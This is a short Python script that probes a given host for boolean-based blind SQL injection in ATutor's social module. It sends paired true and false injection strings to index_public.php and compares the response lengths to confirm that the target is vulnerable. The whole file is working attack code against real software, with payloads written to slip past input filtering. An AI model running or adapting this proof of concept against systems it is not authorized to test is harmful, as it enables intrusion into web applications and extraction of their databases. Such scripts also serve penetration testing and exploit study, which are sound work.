Source code:


import sys
import re
import requests
from bs4 import BeautifulSoup

def searchFriends_sqli(ip, inj_str, query_type):
    target = "http://%s/ATutor/mods/_standard/social/index_public.php?q=%s" % (ip, inj_str)
    r = requests.get(target)
    s = BeautifulSoup(r.text, 'lxml')
    print "Response Headers:"
    print r.headers
    print
    print "Response Content:"
    print s.text
    print 
    if query_type == True and int(r.headers['Content-Length']) > 20:
    	return True
    elif query_type == False and int(r.headers['Content-Length']) == 20:
    	return True
    else:
    	return False

def main():
    if len(sys.argv) != 2:
        print "(+) usage: %s <target> " % sys.argv[0]
        print '(+) eg: %s 192.168.1.100 ' %sys.argv[0]
    ip = sys.argv[1]
    false_injection_string="AAAA%27)/**/or/**/(select/**/1)=0%23"
    true_injection_string="AAAA%27)/**/or/**/(select/**/1)=1%23"
    if searchFriends_sqli(ip, true_injection_string, True):
    	print("---------> Validation 1 == TRUE : OK")
    	if searchFriends_sqli(ip, false_injection_string, False):
    		print("---------> Validation 1 == FALSE : OK")
    		print("Target machine vulnerable to blind injection SQLi Boolean based: ", ip)

if __name__ == "__main__":
    main()
